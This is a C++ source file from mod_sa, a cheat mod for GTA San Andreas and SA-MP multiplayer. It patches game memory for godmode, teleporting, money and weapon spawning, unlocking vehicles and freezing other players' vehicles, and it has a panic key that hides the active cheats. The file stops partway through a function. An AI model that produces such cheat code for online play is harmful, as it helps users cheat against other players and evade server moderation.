/*

	PROJECT:		mod_sa
	LICENSE:		See LICENSE in the top level directory
	COPYRIGHT:		Copyright we_sux, FYP

	mod_sa is available from http://code.google.com/p/m0d-s0beit-sa/

	mod_sa is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	mod_sa is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with mod_sa.  If not, see <http://www.gnu.org/licenses/>.

*/
#include "main.h"


int iClickWarpEnabled = 0;

int cheat_panic ( void )
{
	traceLastFunc( "cheat_panic()" );

	static int	pstate_map = 0, // m0d's map
		pstate_d3dtext_hud = 0, // hud bar
		pstate_actor_hp_nSP = 0, // "Extra actor invincibility" patch (invulnerable single player enemies)
		pstate_actor_hp_SP = 0, // "Extra actor invincibility2" patch (no problems in SP)
		pstate_vehicle_hp = 0, // vehicle hp patch
		pstate_generic_menu = 0, // m0d's menu
		pstate_infnos = 0, // infinite NOS
		pstate_ini[INI_PATCHES_MAX],
		pstate_dummy_aligner; // this should all be a structure, static = DOING IT WRONG
	int			i;

	// sa-mp related
	static int	pstate_chat = 0, // chat
		pstate_deathlist = 0, // deathlist
		pstate_extragm = 0; // extra godmode

	if ( KEY_PRESSED(set.key_panic) )
	{
		// toggle panic
		cheat_state->_generic.cheat_panic_enabled ^= 1;

		if ( cheat_state->_generic.cheat_panic_enabled )
		{
			struct actor_info	*actor_info = actor_info_get( ACTOR_SELF, ACTOR_ALIVE );

			if ( actor_info )
			{
				actor_info->flags &= ~ACTOR_FLAGS_INVULNERABLE;
				actor_info->weapon_slot = 0;
			}

			// remove infinite NOS
			pstate_infnos = cheat_state->vehicle.infNOS_toggle_on;
			cheat_state->vehicle.infNOS_toggle_on = false;
			patcher_remove( &patch_vehicle_inf_NOS );

			if ( pPedSelf->GetVehicle() )
			{
				CVehicle	*pVehicleSelf = pPedSelf->GetVehicle();
				CVehicle	*pVehicleTemp = NULL;

				for ( pVehicleTemp = pVehicleSelf; pVehicleTemp != NULL; pVehicleTemp = pVehicleTemp->GetTowedVehicle() )
				{
					pVehicleTemp->SetGravity( &CVector(0.0, 0.0, -1.0) );
					pVehicleTemp->SetCanBeDamaged( true );

					if ( !set.trailer_support )
						break;
				}

				// remove inf NOS
				if ( pstate_infnos )
				{
					pVehicleSelf->RemoveVehicleUpgrade( 1010 );
					//pVehicleSelf->AddVehicleUpgrade( 1010 );
				}

				// reset overrideLights, pstate not needed, will be reactivated on demand
				if ( set.enable_car_lights_at_day_time )
					pVehicleSelf->SetOverrideLights( 0 );
			}

			// hud bar, this should probably become a cheat_state
			pstate_d3dtext_hud = set.d3dtext_hud;
			set.d3dtext_hud = 0;

			// m0d's map
			pstate_map = cheat_state->_generic.map;
			cheat_state->_generic.map = 0;

			// m0d's menu
			pstate_generic_menu = cheat_state->_generic.menu;
			cheat_state->_generic.menu = 0;

			// remove "Extra actor invincibility" patch
			pstate_actor_hp_nSP = patch_actor_hp_extraInv.installed;
			patcher_remove( &patch_actor_hp_extraInv );
			pstate_actor_hp_SP = patch_actor_hp.installed;
			patcher_remove( &patch_actor_hp );

			// remove vehicle hp patch
			pstate_vehicle_hp = patch_vehicle_hp.installed;
			patcher_remove( &patch_vehicle_hp );

			// just call with null vehicle info to disable
			cheat_handle_vehicle_fly( NULL, 0.0f );

			for ( i = 0; i < INI_PATCHES_MAX; i++ )
			{
				// added to not remove volatile patches
				if ( !set.patch[i].has_volatile )
				{
					pstate_ini[i] = set.patch[i].installed;
					patcher_remove( &set.patch[i] );
				}
			}

			// turn off kill & chat
			if ( g_DeathList != NULL )
			{
				pstate_deathlist = g_DeathList->iEnabled;
				g_DeathList->iEnabled = 1;
			}
			if ( g_Chat != NULL )
			{
				pstate_chat = g_Chat->iChatWindowMode;
				g_Chat->iChatWindowMode = 2;
			}
			pstate_extragm = set.enable_extra_godmode;
			set.enable_extra_godmode = 0;
		}
		else
		{
			// restore infinite NOS
			if ( pstate_infnos )
			{
				cheat_state->vehicle.infNOS_toggle_on = true;
				patcher_install( &patch_vehicle_inf_NOS );
			}

			// vehicle stuff
			CPed	*pPedSelf = pPools->GetPedFromRef( CPOOLS_PED_SELF_REF );
			if ( pPedSelf->GetVehicle() )
			{
				CVehicle	*pVehicleSelf = pPedSelf->GetVehicle();
				// restore inf NOS
				if ( pstate_infnos )
				{
					pVehicleSelf->AddVehicleUpgrade( 1010 );
				}
			}


			// restore "Extra actor invincibility" patch
			if ( pstate_actor_hp_nSP )
				patcher_install( &patch_actor_hp_extraInv );
			if ( pstate_actor_hp_SP )
				patcher_install( &patch_actor_hp );

			// restore vehicle hp patch
			if ( pstate_vehicle_hp )
				patcher_install( &patch_vehicle_hp );

			// restore some cheat_states
			set.d3dtext_hud = pstate_d3dtext_hud;
			cheat_state->_generic.map = pstate_map;
			cheat_state->_generic.menu = pstate_generic_menu;

			// restore patches
			for ( i = 0; i < INI_PATCHES_MAX; i++ )
			{
				if ( pstate_ini[i] )
					patcher_install( &set.patch[i] );
			}

			// restore kill & chat
			if ( g_DeathList != NULL )
			{
				g_DeathList->iEnabled = pstate_deathlist;
			}
			if ( g_Chat != NULL )
			{
				g_Chat->iChatWindowMode = pstate_chat;
			}

			// restore extra invincibility mode state
			set.enable_extra_godmode = pstate_extragm;

			// clear cheat state text
			cheat_state_text( NULL );
		}
	}

	return cheat_state->_generic.cheat_panic_enabled;
}

/* XXX move to cheat_funcs.cpp? */
extern bool GTAfunc_RemoveActorFromCarAndPutAt_requestingTeleport;
void cheat_teleport ( const float pos[3], int interior_id )
{
	if ( cheat_state->state == CHEAT_STATE_ACTOR
		|| GTAfunc_RemoveActorFromCarAndPutAt_requestingTeleport )
	{
		GTAfunc_RemoveActorFromCarAndPutAt_requestingTeleport = false;
		cheat_actor_teleport( actor_info_get(ACTOR_SELF, 0), pos, interior_id );
	}
	else if ( cheat_state->state == CHEAT_STATE_VEHICLE ) //&& !set.teleport_slow )
		cheat_vehicle_teleport( vehicle_info_get(VEHICLE_SELF, 0), pos, interior_id );
	/*else if ( cheat_state->state == CHEAT_STATE_VEHICLE && set.teleport_slow )
	{
		vect3_copy(pos, cheat_state->vehicle.tele_coords);
		cheat_state->vehicle.tele_on = 1;
	}*/
}

void cheat_teleport_nearest_car ( void )
{
	int					id = vehicle_find_nearest( VEHICLE_ALIVE | VEHICLE_EMPTY );
	struct vehicle_info *info = vehicle_info_get( id, VEHICLE_ALIVE | VEHICLE_EMPTY );

	if ( id == -1 || info == NULL )
		return;

	cheat_teleport( &info->base.matrix[4 * 3], info->base.interior_id );
}

void cheat_handle_misc ( void )
{
	if ( set.clickwarp_enabled && iIsSAMPSupported )
	{
		if(KEY_PRESSED(set.key_clickwarp_enable))
		{
			g_iCursorEnabled ^= 1;
			toggleSAMPCursor(g_iCursorEnabled);
		}
		if(g_iCursorEnabled && KEY_PRESSED(set.key_clickwarp_click))
		{
			iClickWarpEnabled = 1;
		}
	}

	if ( KEY_PRESSED(set.key_map) )
	{
		cheat_state->_generic.map ^= 1; /* toggle minimap */
	}

	if ( KEY_PRESSED(set.key_map_show_vehicles) )
	{
		cheat_state->_generic.map_vehicles ^= 1;
	}

	if ( KEY_DOWN(set.secondary_key) )
	{
		if ( KEY_PRESSED(set.key_render_player_tags) )
			cheat_state->render_player_tags ^= 1;
		if ( KEY_PRESSED(set.key_render_vehicle_tags) )
			cheat_state->render_vehicle_tags ^= 1;
	}

	/* time */
	if ( set.force_hour >= 0 )
		gta_time_hour_set( set.force_hour );

	/* weather */
	if ( set.force_weather >= 0 )
		gta_weather_state_set( set.force_weather );

	SetCloudsEnabled( set.enable_clouds );
}

void cheat_handle_debug ( HWND wnd )
{
	static const int	data_size[4] = { 1, 2, 4, 4 };
	struct debug_info	*debug = &cheat_state->debug;
	int					move = 0, hist_chng = 0;

	if ( !cheat_state->debug_enabled )
		return;

	/* go to pointer */
	if ( KEY_PRESSED(VK_NUMPAD1) )
	{
		setDebugPointer( *(void **)debug->cursor_data );
		hist_chng = 1;
	}

	/* go back */
	if ( KEY_PRESSED(VK_NUMPAD7) )
	{
		if ( debug->hist_pos > 0 )
		{
			debug->hist_pos--;
			hist_chng = 1;
		}
		else if ( debug->hist_pos == 0 )
			setDebugPointer( (void *)NULL );
	}

	/* change data type */
	if ( KEY_PRESSED(VK_DIVIDE) )
		debug->data_type = ( debug->data_type + 1 ) % 4;

	/* inc/dec value */
	if ( KEY_DOWN(VK_ADD) || KEY_DOWN(VK_SUBTRACT) )
	{
		const int	value = KEY_DOWN( VK_ADD ) ? 1 : -1;
		uint8_t		data[4] = { 0, 0, 0, 0 };

		if ( memcpy_safe(data, debug->ptr[debug->hist_pos] + debug->offset[debug->hist_pos], data_size[debug->data_type]) )
		{
			switch ( debug->data_type )
			{
#pragma warning( disable : 4244 )

			case 0:
				( *(uint8_t *)data ) += ( uint8_t ) value;
				break;

			case 1:
				( *(uint16_t *)data ) += ( uint16_t ) value;
				break;

			case 2:
				( *(uint32_t *)data ) += ( uint32_t ) value;
				break;

			case 3:
				( *(float *)data ) += (float)value / 10.0f;
				break;
			}

			memcpy_safe( debug->ptr[debug->hist_pos] + debug->offset[debug->hist_pos], data, data_size[debug->data_type] );
		}
	}

	/* copy info to clipboard */
	if ( KEY_PRESSED(VK_MULTIPLY) )
	{
		if ( OpenClipboard(wnd) )
		{
			HGLOBAL mem = GlobalAlloc( GMEM_MOVEABLE, sizeof(debug->ptr_hist_str) );

			if ( mem != NULL )
			{
				char	*str = (char *)GlobalLock( mem );

				strlcpy( str, debug->ptr_hist_str, sizeof(debug->ptr_hist_str) );
				Log( "%s", str );
				GlobalUnlock( str );

				EmptyClipboard();

				if ( !SetClipboardData(CF_TEXT, mem) )
					Log( "SetClipboardData() %d", GetLastError() );

				/*SetClipboardData(CF_TEXT, mem);*/
			}

			CloseClipboard();
		}
		else
		{
			Log( "OpenClipboard() %d", GetLastError() );
		}
	}

	if ( KEY_PRESSED(VK_NUMPAD4) )
		move -= data_size[debug->data_type];
	if ( KEY_PRESSED(VK_NUMPAD6) )
		move += data_size[debug->data_type];
	if ( KEY_PRESSED(VK_NUMPAD8) )
		move += -16;
	if ( KEY_PRESSED(VK_NUMPAD2) )
		move += 16;
	if ( KEY_PRESSED(VK_NUMPAD9) )
		move += -160;
	if ( KEY_PRESSED(VK_NUMPAD3) )
		move += 160;

	debug->offset[debug->hist_pos] += move;

	if ( move != 0 || hist_chng )
	{
		memset( debug->modify_time, 0, DEBUG_DATA_SIZE * sizeof(uint32_t) );
		debug->data_prev_clear = 1;
	}

	for ( int i = 0; i < 9; i++ )
		KEY_CONSUME( VK_NUMPAD1 + i );
	KEY_CONSUME( VK_MULTIPLY );
	KEY_CONSUME( VK_DIVIDE );
	KEY_CONSUME( VK_ADD );
	KEY_CONSUME( VK_SUBTRACT );
}

void cheat_handle_spoof_weapon ( void )
{
	struct actor_info	*info = actor_info_get( ACTOR_SELF, ACTOR_ALIVE );

	/*struct samp_info *spl = samp_info_get();*/
	if ( info != NULL )
	{
		if ( cheat_state->_generic.spoof_weapon != -1 )
			info->weapon_hit_type = ( uint8_t ) cheat_state->_generic.spoof_weapon;
	}
}

void cheat_handle_weapon_disable ( void )
{
	struct actor_info	*self = actor_info_get( ACTOR_SELF, 0 );
	struct actor_info	*info;
	int					bad_weapon_ids[] =
	{
		16, /* Grenade */
		17, /* Teargas */
		18, /* Molotov Cocktail */
		35, /* Rocket Launcher */
		36, /* Heat Seeking RPG */
		39, /* Remote Explosives */
		40, /* Detonator */
		-1
	};
	int					i, j;

	if ( !cheat_state->_generic.weapon_disable )
		return;

	for ( i = 0; i < pool_actor->size; i++ )
	{
		if ( (info = actor_info_get(i, ACTOR_ALIVE)) == NULL )
			continue;

		if ( info == self )
			continue;

		if ( info->weapon_slot > 12 )
			continue;

		if ( (int)info->weapon[info->weapon_slot].id > 46 ) /* invalid weapon ID */
			goto bad_weapon;

		/* filter disallowed weapons */
		for ( j = 0; bad_weapon_ids[j] != -1; j++ )
		{
			if ( (int)info->weapon[info->weapon_slot].id == bad_weapon_ids[j] )
				goto bad_weapon;
		}

		continue;
bad_weapon: ;
		info->weapon_slot = 0;
	}
}

struct freeze_info
{
	int		set;
	float	matrix[16];
};

void cheat_handle_freeze_vehicles ( struct vehicle_info *vehicle_info, struct actor_info *actor_info )
{
	traceLastFunc( "cheat_handle_freeze_vehicles()" );

	static struct freeze_info	*freeze;
	struct vehicle_info			*info;
	float						*pos;
	int							i;

	if ( KEY_PRESSED(set.key_vehicles_freeze) )
	{
		cheat_state->_generic.vehicles_freeze ^= 1;
		if ( !cheat_state->_generic.vehicles_freeze && freeze != NULL )
			memset( freeze, 0, pool_vehicle->size * sizeof(struct freeze_info) );
	}

	if ( vehicle_info != NULL )
		pos = &vehicle_info->base.matrix[4 * 3];
	else if ( actor_info != NULL )
		pos = &actor_info->base.matrix[4 * 3];
	else
		return;

	if ( freeze == NULL )	/* XXX free on exit */
	{
		freeze = (struct freeze_info *)malloc( pool_vehicle->size * sizeof(struct freeze_info) );
		if ( freeze == NULL )
			return;
		memset( freeze, 0, pool_vehicle->size * sizeof(struct freeze_info) );
	}

	if ( cheat_state->_generic.vehicles_freeze )
	{
		for ( i = 0; i < pool_vehicle->size; i++ )
		{
			if ( (info = vehicle_info_get(i, VEHICLE_ALIVE)) == NULL || info == vehicle_info )
			{
				if ( info == vehicle_info && freeze[i].set )
					cheat_vehicle_air_brake_set( 1 );	/* entered a frozen vehicle */
				freeze[i].set = 0;
				continue;
			}

			if ( freeze[i].set )
			{
				matrix_copy( freeze[i].matrix, info->base.matrix );
				vect3_mult( info->speed, 0.0f, info->speed );
				vect3_mult( info->spin, 0.0f, info->spin );
			}

			if ( vehicle_contains_trailer(vehicle_info, info) )
			{
				freeze[i].set = 0;
				continue;
			}

			if ( vect3_dist(pos, &info->base.matrix[4 * 3]) >= 80.0f )
			{
				freeze[i].set = 0;
				continue;
			}

			if ( freeze[i].set )
			{
				continue;
			}

			matrix_copy( info->base.matrix, freeze[i].matrix );
			freeze[i].set = 1;
		}
	}
}

void cheat_handle_unlock ( void )
{
	struct vehicle_info *info;
	int					i;

	if ( cheat_state->_generic.vehicles_unlock )
	{
		for ( i = 0; i < pool_vehicle->size; i++ )
		{
			info = vehicle_info_get( i, 0 );
			if ( info != NULL )
				info->door_status = 1;			/* unlocked */
		}
	}
}

void cheat_handle_hp ( struct vehicle_info *vehicle_info, struct actor_info *actor_info, float time_diff )
{
	traceLastFunc( "cheat_handle_hp()" );

	static float	prev_pos[3];

	if ( KEY_PRESSED(set.key_hp_cheat) )
		cheat_state->_generic.hp_cheat ^= 1;	/* toggle hp cheat */

	// this will make SP enemies invulnerable
	// now checking for a valid SAMP game
	if (g_SAMP)
	{
		if ( cheat_state->_generic.hp_cheat && cheat_state->actor.invulnerable && !set.hp_disable_inv_sp_enemies )
			patcher_install( &patch_actor_hp_extraInv );
		else
			patcher_remove( &patch_actor_hp_extraInv );
	}
	
	if ( cheat_state->_generic.hp_cheat && cheat_state->actor.invulnerable )
		patcher_install( &patch_actor_hp );
	else
		patcher_remove( &patch_actor_hp );

	if ( cheat_state->_generic.hp_cheat && cheat_state->vehicle.invulnerable )
		patcher_install( &patch_vehicle_hp );
	else
		patcher_remove( &patch_vehicle_hp );

	if ( vehicle_info != NULL )
	{
		struct vehicle_info *info = vehicle_info;
		struct vehicle_info *temp;

		// actor_info is NULL, if vehicle_info is not ( we need the actor though )
		actor_info = actor_info_get( ACTOR_SELF, 0 );

		if ( cheat_state->_generic.hp_cheat )
		{

			for ( temp = info; temp != NULL; temp = temp->trailer )
			{
				if(temp == NULL) return;

				/* minimum hp */
				if ( cheat_state->vehicle.hp_minimum_on && temp->hitpoints < set.hp_minimum )
					temp->hitpoints = set.hp_minimum;

				if ( set.hp_keep_vehicleHPsane )
				{
					// actor_info was NULL duh
					if ( temp->passengers[0] == actor_info && temp->hitpoints > 1000.0f )
					{
						if ( set.hp_minimum <= 1000.0f )
							temp->hitpoints = 1000.0f;
						else if ( temp->hitpoints > set.hp_minimum )
							temp->hitpoints = set.hp_minimum;
					}
				}

				/* regen */
				if ( temp->hitpoints < 1000.0f )
					temp->hitpoints += time_diff * set.hp_regen;

				if ( cheat_state->vehicle.invulnerable )
				{
					temp->m_nVehicleFlags.bCanBeDamaged = false;
					//temp->flags |= VEHICLE_FLAGS_INVULNERABLE;	/* invulnerable to most things */
					temp->flags &= ~2; /* make sure we're not frozen :p */
					//if ( temp->pulling_truck != NULL )
					//	temp->hitpoints = 1000.0f;
				}
				else
				{
					temp->m_nVehicleFlags.bCanBeDamaged = true;
					//temp->flags &= ~VEHICLE_FLAGS_INVULNERABLE;
				}

				if ( cheat_state->vehicle.hp_tire_support )
					cheat_vehicle_tires_set( temp, 0 );

				/*
				if(cheat_state->vehicle.is_engine_on == 1)
					temp->m_nVehicleFlags.bEngineOn = 1;
				else if((cheat_state->vehicle.is_engine_on == 0))
					temp->m_nVehicleFlags.bEngineOn = 0;
				*/
				// temp->engine_state |= 16; // protect against engine stalls
				if ( !set.trailer_support )
					break;
			}
		}
		else
		{
			for ( temp = info; temp != NULL; temp = temp->trailer )
			{
				if(temp == NULL) return;

				// HP cheat disabled - keep HP value sane
				if ( set.hp_keep_vehicleHPsane )
				{
					if ( temp->hitpoints > 1000.0f )
						temp->hitpoints = 1000.0f;
				}

				temp->m_nVehicleFlags.bCanBeDamaged = true;
				//temp->flags &= ~VEHICLE_FLAGS_INVULNERABLE;

				if ( !set.trailer_support )
					break;
			}
		}
	}

	if ( actor_info != NULL )
	{
		struct actor_info	*info = actor_info;

		if ( cheat_state->_generic.hp_cheat )
		{
			if ( info->hitpoints < 100.0f )
				info->hitpoints += time_diff * set.hp_regen_onfoot;
		}

		if ( cheat_state->_generic.hp_cheat && cheat_state->actor.invulnerable )
		{
			// invulnerability is on - at least be
			//  invulnerable against non explosive projectiles
			info->flags |= 4;
			if ( set.hp_actor_explosion_inv )
				info->flags |= 8;
			if ( set.hp_actor_fall_inv )
				info->flags |= 64;
			if ( set.hp_actor_fire_inv )
				info->flags |= 128;
			//info->flags |= ACTOR_FLAGS_INVULNERABLE;
		}
		else
			info->flags &= ~ACTOR_FLAGS_INVULNERABLE;
	}
}

void cheat_handle_stick ( struct vehicle_info *vehicle_info, struct actor_info *actor_info, float time_diff )
{
	traceLastFunc( "cheat_handle_stick()" );

	struct object_base	*base_stick, *base_self;
	struct actor_info	*actor_stick;
	struct vehicle_info *vehicle_stick;
	float				*speed_stick, *speed_self;
	float				*spin_stick, *spin_self;
	static int			id = -1;
	int					i;

	if ( KEY_PRESSED(set.key_stick) )
	{
		if ( vehicle_info != NULL )
			cheat_state->vehicle.stick ^= 1;
		else
			cheat_state->actor.stick ^= 1;
		id = actor_find( id - 1, 1, ACTOR_ALIVE | ACTOR_NOT_SAME_VEHICLE );
	}

	if ( KEY_PRESSED(set.key_stick_nearest) )
	{
		if ( vehicle_info != NULL )
			cheat_state->vehicle.stick ^= 1;
		else
			cheat_state->actor.stick ^= 1;
		id = actor_find_nearest( ACTOR_ALIVE | ACTOR_NOT_SAME_VEHICLE );
	}

	if ( (vehicle_info != NULL && cheat_state->vehicle.stick) || (actor_info != NULL && cheat_state->actor.stick) )
	{
		// remove any bad vehicle or actor stuffs
		if ( isBadPtr_GTA_pVehicle(vehicle_info) )
			vehicle_info = NULL;
		if ( isBadPtr_GTA_pPed(actor_info) )
			actor_info = NULL;

		/* check if actor has disappeared.. and if it has, switch to teh nearest */
		if ( id != -1 && actor_info_get(id, ACTOR_ALIVE) == NULL )
			id = actor_find_nearest( ACTOR_ALIVE | ACTOR_NOT_SAME_VEHICLE );

		if ( KEY_PRESSED(set.key_stick_prev) )
			id = actor_find( id, -1, ACTOR_ALIVE | ACTOR_NOT_SAME_VEHICLE );

		if ( KEY_PRESSED(set.key_stick_next) )
			id = actor_find( id, 1, ACTOR_ALIVE | ACTOR_NOT_SAME_VEHICLE );

		/* no actors to stick to */
		if ( id == -1 )
		{
			cheat_state_text( "No players found; stick disabled." );
			cheat_state->vehicle.stick = 0;
			cheat_state->actor.stick = 0;
			return;
		}

		/* get actor struct for the actor we're sticking to */
		actor_stick = actor_info_get( id, ACTOR_ALIVE | ACTOR_NOT_SAME_VEHICLE );
		if ( actor_stick == NULL )
			return;

		/* is this actor in a vehicle? */
		vehicle_stick = actor_vehicle_get( actor_stick );

		base_stick = vehicle_stick ? &vehicle_stick->base : &actor_stick->base;
		base_self = vehicle_info ? &vehicle_info->base : &actor_info->base;

		speed_stick = vehicle_stick ? vehicle_stick->speed : actor_stick->speed;
		speed_self = vehicle_info ? vehicle_info->speed : actor_info->speed;

		spin_stick = vehicle_stick ? vehicle_stick->spin : actor_stick->spin;
		spin_self = vehicle_info ? vehicle_info->spin : actor_info->spin;

		/* allow warping to work + always warp towards whatever we're sticking to...
         but only when we're in a vehicle */
		if ( KEY_PRESSED(set.key_warp_mod) && vehicle_info != NULL )
		{
			float	out[4];

			/* multiply the matrix of whatever we're sticking to with the user supplied vector */
			matrix_vect4_mult( base_stick->matrix, set.stick_vect, out );

			/* multiply the result with the negative warp-speed value, and put it in the speed vector
            (negative because we want to warp towards teh target, not away from it */
			vect3_mult( out, -set.warp_speed, speed_self );
		}

		if ( !KEY_DOWN(set.key_warp_mod) )
		{
			float	d[4] = { 0.0f, 0.0f, 0.0f, 0.0f };
			float	accel_mult = 1.0f;
			float	out[4];

			/* handle stick movement keys */
			if ( KEY_DOWN(set.key_stick_forward) )
				d[1] += 1.0f;
			if ( KEY_DOWN(set.key_stick_backward) )
				d[1] -= 1.0f;
			if ( KEY_DOWN(set.key_stick_left) )
				d[0] -= 1.0f;
			if ( KEY_DOWN(set.key_stick_right) )
				d[0] += 1.0f;
			if ( KEY_DOWN(set.key_stick_up) )
				d[2] += 1.0f;
			if ( KEY_DOWN(set.key_stick_down) )
				d[2] -= 1.0f;
			if ( KEY_DOWN(set.key_stick_in) )
				d[3] -= 1.0f;
			if ( KEY_DOWN(set.key_stick_out) )
				d[3] += 1.0f;

			if ( !near_zero(set.stick_accel_time) )
			{
				static uint32_t time_start;

				if ( !vect4_near_zero(d) )
					time_start = ( time_start == 0 ) ? time_get() : time_start;
				else
					time_start = 0;			/* no keys pressed */

				/* acceleration */
				if ( time_start != 0 )
				{
					float	t = TIME_TO_FLOAT( time_get() - time_start );
					if ( t < set.stick_accel_time )
						accel_mult *= t / set.stick_accel_time;
				}
			}

			/* calculate new vector + dist */
			if ( !vect3_near_zero(d) && !vect3_near_zero(set.stick_vect) )
			{
				for ( i = 0; i < 3; i++ )
				{
					d[i] = set.stick_vect[i] * set.stick_vect_dist + d[i] * time_diff * 8.0f * accel_mult;
				}

				set.stick_vect_dist = vect3_length( d );
				vect3_normalize( d, set.stick_vect );
			}

			/* move towards/away from the center */
			if ( !near_zero(d[3]) )
				set.stick_vect_dist += d[3] * time_diff * 40.0f * accel_mult;

			/* Teleport vehicle detachables */
			if ( vehicle_info != NULL )
				vehicle_detachables_teleport( vehicle_info, &base_self->matrix[4 * 3], &base_stick->matrix[4 * 3] );

			matrix_copy( base_stick->matrix, base_self->matrix );
			vect3_copy( speed_stick, speed_self );
			vect3_copy( spin_stick, spin_self );

			/*base_self->interior_id = base_stick->interior_id;
         gta_interior_id_set(base_stick->interior_id);*/
			/* multiply the matrix of the target with the user supplied vector */
			matrix_vect4_mult( base_stick->matrix, set.stick_vect, out );

			/* multiply the result with the user supplied vector distance */
			vect3_mult( out, set.stick_vect_dist, out );

			/* and add it to our position */
			vect3_vect3_add( &base_self->matrix[4 * 3], out, &base_self->matrix[4 * 3] );

			if ( vehicle_info != NULL )
			{
				/* Teleport detachables again :p */
				vehicle_detachables_teleport( vehicle_info, &base_stick->matrix[4 * 3], &base_self->matrix[4 * 3] );
				vehicle_prevent_below_height( vehicle_info, set.stick_min_height );
			}
			else if ( actor_info != NULL )
			{
				// new pedFlags
				actor_info->pedFlags.bIsStanding = true;
				actor_info->pedFlags.bWasStanding = true;
				actor_info->pedFlags.bStayInSamePlace = true;
			}
		}
	}
}

static int __money_interval_rand_time ( void )
{
	const int	min = set.money_interval_rand_min;
	const int	max = set.money_interval_rand_max + 1;

	return MSEC_TO_TIME( (min + (rand() % (max - min))) * 1000 );
}

void cheat_handle_money ( void )
{
	static uint32_t next_time;

	if ( !cheat_state->_generic.money )
		next_time = time_get();

	if ( KEY_PRESSED(set.key_money) )
		cheat_state->_generic.money ^= 1;

	if ( cheat_state->_generic.money && time_get() >= next_time )
	{
		const int	min = set.money_amount_rand_min;
		const int	max = set.money_amount_rand_max;
		uint32_t	money = gta_money_get();
		int			add;

		if ( money < (uint32_t) set.money_amount_max )
		{
			add = ( (max - min) > 0 ) ? ( rand() % (max - min) ) : 0;
			add = ( (add + 50) / 100 ) * 100;
			money += min + add;
			gta_money_set( money );
		}

		next_time = time_get() + __money_interval_rand_time();
	}
}

void cheat_handle_weapon ( void )
{
	struct actor_info	*actor_info = actor_info_get( ACTOR_SELF, ACTOR_ALIVE );
	int					i;

	if ( KEY_PRESSED(set.key_weapon) )
		cheat_state->_generic.weapon ^= 1;	/* toggle weapon cheat */

	if ( cheat_state->_generic.weapon )
	{
		if ( actor_info != NULL )
		{
			for ( i = 0; i < 13; i++ )
			{
				if ( set.weapon[i] == NULL )
					continue;

				if ( set.ammo_random )
				{
					if ( actor_info->weapon[set.weapon[i]->slot].id != set.weapon[i]->id
					 ||	 (
							 actor_info->weapon[set.weapon[i]->slot].ammo == 0
					 &&	 actor_info->weapon[set.weapon[i]->slot].ammo_clip == 0
					 ) )
					{
						int randammo = ( rand() % set.ammo ) + 1;
						int randammoclip = ( rand() % set.ammo_clip ) + 1;
						gta_weapon_set( actor_info, set.weapon[i]->slot, set.weapon[i]->id, randammo, randammoclip );
					}
				}
				else
				{
					gta_weapon_set( actor_info, set.weapon[i]->slot, set.weapon[i]->id, set.ammo, set.ammo_clip );
				}
			}
		}
		else if ( !set.restore_weapons_after_death )
		{
			cheat_state->_generic.weapon = 0;
		}
	}
}

void cheat_handle_teleport ( struct vehicle_info *vehicle_info, struct actor_info *actor_info, float time_diff )
{
	traceLastFunc( "cheat_handle_teleport()" );

	struct object_base	*base = ( vehicle_info != NULL ) ? &vehicle_info->base : &actor_info->base;
	int					i;

	// Set teleport coordinates
	for ( i = 0; i < TELEPORT_MAX; i++ )
	{
		if ( set.key_teleport_set[i] == 0 )
			continue;
		if ( KEY_PRESSED(set.key_teleport_set[i]) )
		{
			cheat_state->teleport[i].set = 1;
			matrix_copy( base->matrix, cheat_state->teleport[i].matrix );
			cheat_state->teleport[i].interior_id = gta_interior_id_get();
			cheat_state_text( "Teleport coordinates set." );
		}
	}

	// Teleport to stored coordinates
	for ( i = 0; i < TELEPORT_MAX; i++ )
	{
		if ( set.key_teleport[i] == 0 )
			continue;
		if ( KEY_PRESSED(set.key_teleport[i]) )
		{
			if ( cheat_state->teleport[i].set )
			{
				cheat_teleport_history_save();
				cheat_teleport( &cheat_state->teleport[i].matrix[4 * 3], cheat_state->teleport[i].interior_id );

				// when teleports are stored in-game, we have a copy of the matrix to preserve rotation, etc..
				matrix_copy( cheat_state->teleport[i].matrix, base->matrix );
			}
			else if ( !vect3_near_zero(set.teleport[i].pos) )
			{
				cheat_teleport_history_save();
				cheat_teleport( set.teleport[i].pos, set.teleport[i].interior_id );
			}
			else
			{
				cheat_state_text( "Teleport coordinates not set." );
				break;
			}
			break;
		}
	}

	if ( KEY_PRESSED(set.key_teleport_hist) )
	{
		struct cheat_state_teleport *teleport = NULL;

		cheat_state->teleport_hist_count--;
		if ( cheat_state->teleport_hist_count < 0 )
			cheat_state->teleport_hist_count = 0;
		else
			teleport = &cheat_state->teleport_hist[cheat_state->teleport_hist_count];

		if ( teleport != NULL && teleport->set )
		{
			cheat_teleport( &teleport->matrix[4 * 3], teleport->interior_id );
			matrix_copy( teleport->matrix, base->matrix );
			teleport->set = 0;
		}
		else
		{
			cheat_state_text( "Teleport history list is empty." );
		}
	}
}

void cheat_handle_checkpoint ( void )
{
	if ( KEY_PRESSED(set.key_checkpoint_1) || KEY_PRESSED(set.key_checkpoint_2) )
	{
		int					n = KEY_PRESSED( set.key_checkpoint_1 ) ? 0 : 1;
		struct checkpoint	*cp = gta_checkpoint_info_get( n );
		float				pos[3];

		if ( cp != NULL )
		{
			struct vehicle_info *vehicle_info = vehicle_info_get( VEHICLE_SELF, 0 );

			vect3_copy( cp->position, pos );
			pos[2] += 1.0f;
			cheat_teleport( pos, 0 );		/* XXX interior id? */

			if ( vehicle_info != NULL )
				vehicle_prevent_below_height( vehicle_info, set.checkpoint_min_height );
		}
		else
		{
			cheat_state_text( "Checkpoint does not exist." );
		}
	}
}



void cheat_handle_unfreeze ( struct vehicle_info *vehicle_info, struct actor_info *actor_info, float time_diff )
{
	traceLastFunc( "cheat_handle_unfreeze()" );

	if ( KEY_PRESSED(set.key_anti_freeze) )
	{
		GTAfunc_TogglePlayerControllable(0);
		GTAfunc_LockActor(0);
		pGameInterface->GetCamera()->RestoreWithJumpCut();
		
		// stop all animations
		if ( actor_info != NULL && !actor_info->pedFlags.bInVehicle )
			GTAfunc_DisembarkInstantly();
	}
}

void cheat_handle_pulsedisk () 
{ 
	traceLastFunc( "cheat_handle_pulsedisk()" ); 
	if( cheat_state->_generic.pulsedisk == 1 ) 
	{
		pPedSelf->SetCurrentWeaponSlot( eWeaponSlot (rand()%46) );
	}
	return;
}




void cheat_handle_qqqq () 
{ 
